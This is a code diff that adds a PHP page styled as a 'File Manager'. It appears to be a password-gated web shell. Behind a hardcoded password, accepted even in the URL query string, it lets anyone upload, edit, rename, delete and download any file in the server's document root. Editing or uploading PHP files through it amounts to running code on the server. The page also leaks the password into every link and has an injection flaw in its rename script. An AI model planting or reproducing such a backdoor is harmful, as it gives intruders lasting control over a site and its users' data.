@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>File Manager</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#1a1a2e;color:#e0e0e0;font:14px/1.5 'Segoe UI',Arial,sans-serif;padding:20px}
+h1{color:#e94560;margin-bottom:20px}
+a{color:#0f3460;text-decoration:none}
+a:hover{text-decoration:underline}
+.breadcrumb{margin-bottom:15px;padding:10px;background:#16213e;border-radius:6px}
+.breadcrumb a{color:#e94560}
+table{width:100%;border-collapse:collapse;background:#16213e;border-radius:6px;overflow:hidden}
+th{background:#0f3460;padding:10px 12px;text-align:left;font-weight:600}
+td{padding:8px 12px;border-bottom:1px solid #0f3460}
+tr:hover{background:#1a1a3e}
+.dir{color:#e94560}
+.file{color:#a0a0a0}
+.size{text-align:right;color:#888}
+.actions{text-align:right}
+.actions a{margin:0 4px;padding:3px 8px;border-radius:4px;font-size:12px;display:inline-block}
+.btn-dl{background:#0f3460;color:#e0e0e0}
+.btn-edit{background:#533483;color:#e0e0e0}
+.btn-del{background:#e94560;color:#fff}
+.btn-ren{background:#16213e;color:#e0e0e0;border:1px solid #0f3460}
+.upload-form{margin-bottom:20px;padding:15px;background:#16213e;border-radius:6px}
+.upload-form h3{margin-bottom:10px;color:#e94560}
+.form-row{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-bottom:10px}
+input[type="text"],input[type="file"],input[type="password"]{padding:8px 12px;border:1px solid #0f3460;border-radius:4px;background:#1a1a2e;color:#e0e0e0;font-size:14px}
+input[type="submit"],button{padding:8px 16px;background:#e94560;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:14px}
+input[type="submit"]:hover,button:hover{background:#c23152}
+.msg{padding:10px 15px;margin-bottom:15px;border-radius:6px}
+.msg-ok{background:#1b5e20;color:#a5d6a7}
+.msg-err{background:#b71c1c;color:#ef9a9a}
+.editor{margin-top:20px}
+.editor textarea{width:100%;height:400px;padding:10px;background:#0d0d1a;color:#e0e0e0;border:1px solid #0f3460;border-radius:6px;font:13px 'Consolas','Courier New',monospace}
+.editor-btns{margin-top:10px;display:flex;gap:10px}
+</style>
+</head>
+<body>
+
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', '0');
+
+define('ROOT', $_SERVER['DOCUMENT_ROOT']);
+define('PASS', '#R4h4s1a85$C0l3QK!!+');
+
+$auth = isset($_POST['pass']) ? $_POST['pass'] : (isset($_GET['pass']) ? $_GET['pass'] : '');
+
+function h($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
+function real($p) {
+    $p = str_replace('\\', '/', $p);
+    while (strpos($p, '//') !== false) $p = str_replace('//', '/', $p);
+    $p = str_replace('/./', '/', $p);
+    $parts = explode('/', $p);
+    $res = [];
+    foreach ($parts as $part) {
+        if ($part === '..') array_pop($res);
+        elseif ($part !== '' && $part !== '.') $res[] = $part;
+    }
+    return '/' . implode('/', $res);
+}
+function size_h($b) {
+    if ($b === null) return '-';
+    if ($b >= 1073741824) return round($b/1073741824,1).' GB';
+    if ($b >= 1048576) return round($b/1048576,1).' MB';
+    if ($b >= 1024) return round($b/1024,1).' KB';
+    return $b.' B';
+}
+
+$dir = isset($_GET['d']) ? real('/'.trim($_GET['d'],'/')) : '/';
+$full = ROOT . $dir;
+if (!is_dir($full)) { $dir = '/'; $full = ROOT; }
+
+$msg = '';
+$msg_t = '';
+
+if ($auth && $auth === PASS) {
+    // --- Create Folder ---
+    if (isset($_POST['mkdir']) && !empty($_POST['dirname'])) {
+        $nd = real($dir.'/'.basename($_POST['dirname']));
+        $nf = ROOT.$nd;
+        if (!file_exists($nf)) { mkdir($nf, 0755, true); $msg = "Folder created: ".h($nd); $msg_t='ok'; }
+        else { $msg = "Already exists"; $msg_t='err'; }
+    }
+    // --- Create File ---
+    if (isset($_POST['mkfile']) && !empty($_POST['filename'])) {
+        $nd = real($dir.'/'.basename($_POST['filename']));
+        $nf = ROOT.$nd;
+        if (!file_exists($nf)) { file_put_contents($nf, ''); $msg = "File created: ".h($nd); $msg_t='ok'; }
+        else { $msg = "Already exists"; $msg_t='err'; }
+    }
+    // --- Upload ---
+    if (isset($_FILES['upfile']) && $_FILES['upfile']['error'] === UPLOAD_ERR_OK) {
+        $dest = $full.'/'.basename($_FILES['upfile']['name']);
+        if (move_uploaded_file($_FILES['upfile']['tmp_name'], $dest)) {
+            $msg = "Uploaded: ".h($_FILES['upfile']['name']); $msg_t='ok';
+        } else { $msg = "Upload failed"; $msg_t='err'; }
+    }
+    // --- Delete ---
+    if (isset($_GET['del'])) {
+        $target = real($dir.'/'.basename($_GET['del']));
+        $tf = ROOT.$target;
+        if ($tf !== ROOT.'/' && file_exists($tf)) {
+            if (is_dir($tf)) {
+                $it = new RecursiveDirectoryIterator($tf, RecursiveDirectoryIterator::SKIP_DOTS);
+                $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
+                foreach ($files as $f) { $f->isDir() ? rmdir($f->getRealPath()) : unlink($f->getRealPath()); }
+                rmdir($tf);
+            } else { unlink($tf); }
+            $msg = "Deleted: ".h($target); $msg_t='ok';
+        }
+    }
+    // --- Rename ---
+    if (isset($_POST['rename'], $_POST['newname']) && !empty($_POST['newname'])) {
+        $old = real($dir.'/'.basename($_POST['rename']));
+        $new = real($dir.'/'.basename($_POST['newname']));
+        if (file_exists(ROOT.$old) && !file_exists(ROOT.$new)) {
+            rename(ROOT.$old, ROOT.$new); $msg = "Renamed"; $msg_t='ok';
+        } else { $msg = "Rename failed"; $msg_t='err'; }
+    }
+    // --- Save file ---
+    if (isset($_POST['savefile'], $_POST['content'])) {
+        $sf = real($dir.'/'.basename($_POST['savefile']));
+        file_put_contents(ROOT.$sf, $_POST['content']);
+        $msg = "Saved: ".h($sf); $msg_t='ok';
+    }
+}
+
+// --- Breadcrumb ---
+echo '<h1>File Manager</h1>';
+if ($msg) echo '<div class="msg msg-'.($msg_t==='err'?'err':'ok').'">'.h($msg).'</div>';
+
+$parts = array_filter(explode('/', $dir));
+echo '<div class="breadcrumb"><a href="?d=/&pass='.h($auth).'">/</a>';
+$path = '';
+foreach ($parts as $p) { $path .= '/'.$p; echo ' <a href="?d='.urlencode($path).'&pass='.h($auth).'">'.h($p).'</a> /'; }
+echo '</div>';
+
+// --- Login ---
+if (!$auth || $auth !== PASS) {
+    echo '<form method="post" class="upload-form">
+        <h3>Password</h3>
+        <div class="form-row">
+            <input type="password" name="pass" placeholder="Enter password" autofocus>
+            <input type="submit" value="Login">
+        </div>
+    </form>';
+    exit;
+}
+
+// --- Auth OK: show file listing ---
+echo '<table><tr><th>Name</th><th style="width:100px">Size</th><th style="width:100px">Modified</th><th style="width:200px">Actions</th></tr>';
+
+if ($dir !== '/') {
+    $up = dirname($dir);
+    if ($up === '\\' || $up === '') $up = '/';
+    echo '<tr><td class="dir"><a href="?d='.urlencode($up).'&pass='.h($auth).'">..</a></td><td></td><td></td><td></td></tr>';
+}
+
+$items = scandir($full);
+$dirs = []; $files = [];
+foreach ($items as $it) {
+    if ($it === '.' || $it === '..') continue;
+    $f = $full.'/'.$it;
+    if (is_dir($f)) $dirs[] = $it; else $files[] = $it;
+}
+sort($dirs); sort($files);
+
+$token = substr(md5(PASS . $dir), 0, 12);
+$all = array_merge($dirs, $files);
+foreach ($all as $it) {
+    $f = $full.'/'.$it;
+    $isdir = is_dir($f);
+    $rel = $dir.'/'.$it;
+    $rel = real($rel);
+    $sz = $isdir ? '-' : size_h(filesize($f));
+    $mt = date('Y-m-d H:i', filemtime($f));
+
+    $icon = $isdir ? 'D' : 'F';
+    $cls = $isdir ? 'dir' : 'file';
+    echo '<tr>';
+    echo '<td class="'.$cls.'">'.($isdir ? '<a href="?d='.urlencode($rel).'&pass='.h($auth).'">'.h($it).'</a>' : h($it)).'</td>';
+    echo '<td class="size">'.$sz.'</td>';
+    echo '<td>'.$mt.'</td>';
+    echo '<td class="actions">';
+    if (!$isdir) {
+        $dl = $rel;
+        echo '<a class="btn-dl" href="?d='.urlencode(dirname($rel)).'&dl='.urlencode(basename($it)).'&pass='.h($auth).'">DL</a> ';
+        echo '<a class="btn-edit" href="?d='.urlencode(dirname($rel)).'&edit='.urlencode(basename($it)).'&pass='.h($auth).'">Edit</a> ';
+    }
+    echo '<a class="btn-ren" href="#" onclick="doRename(\''.h($it).'\')">Ren</a> ';
+    echo '<a class="btn-del" href="?d='.urlencode($dir).'&del='.urlencode($it).'&pass='.h($auth).'" onclick="return confirm(\'Delete '.h($it).'?\')">Del</a>';
+    echo '</td></tr>';
+}
+echo '</table>';
+
+// --- Download ---
+if (isset($_GET['dl'])) {
+    $df = real($dir.'/'.basename($_GET['dl']));
+    $dp = ROOT.$df;
+    if (is_file($dp)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($df).'"');
+        header('Content-Length: '.filesize($dp));
+        readfile($dp);
+        exit;
+    }
+}
+
+// --- Edit ---
+if (isset($_GET['edit'])) {
+    $ef = real($dir.'/'.basename($_GET['edit']));
+    $ep = ROOT.$ef;
+    if (is_file($ep)) {
+        $content = h(file_get_contents($ep));
+        echo '<div class="editor"><h3>Editing: '.h($ef).'</h3>';
+        echo '<form method="post"><input type="hidden" name="pass" value="'.h($auth).'">';
+        echo '<input type="hidden" name="savefile" value="'.h(basename($ef)).'">';
+        echo '<textarea name="content">'.$content.'</textarea>';
+        echo '<div class="editor-btns"><input type="submit" value="Save"> <a href="?d='.urlencode($dir).'&pass='.h($auth).'"><button type="button">Cancel</button></a></div>';
+        echo '</form></div>';
+    }
+}
+
+// --- Upload / Create forms ---
+echo '<div class="upload-form">
+<h3>Upload File</h3>
+<form method="post" enctype="multipart/form-data">
+<input type="hidden" name="pass" value="'.h($auth).'">
+<div class="form-row"><input type="file" name="upfile"> <input type="submit" value="Upload"></div>
+</form>
+</div>';
+
+echo '<div class="upload-form">
+<h3>New Folder</h3>
+<form method="post">
+<input type="hidden" name="pass" value="'.h($auth).'">
+<div class="form-row"><input type="text" name="dirname" placeholder="Folder name"> <input type="submit" name="mkdir" value="Create"></div>
+</form>
+</div>';
+
+echo '<div class="upload-form">
+<h3>New File</h3>
+<form method="post">
+<input type="hidden" name="pass" value="'.h($auth).'">
+<div class="form-row"><input type="text" name="filename" placeholder="File name"> <input type="submit" name="mkfile" value="Create"></div>
+</form>
+</div>';
+
+// --- Rename JS ---
+?>
+<script>
+function doRename(old) {
+    var n = prompt('New name:', old);
+    if (n && n !== old) {
+        var f = document.createElement('form');
+        f.method = 'post';
+        f.innerHTML = '<input name="pass" value="<?php echo h($auth); ?>"><input name="rename" value="'+old+'"><input name="newname" value="'+n+'">';
+        document.body.appendChild(f);
+        f.submit();
+    }
+}
+</script>
+</body>
+</html>
+
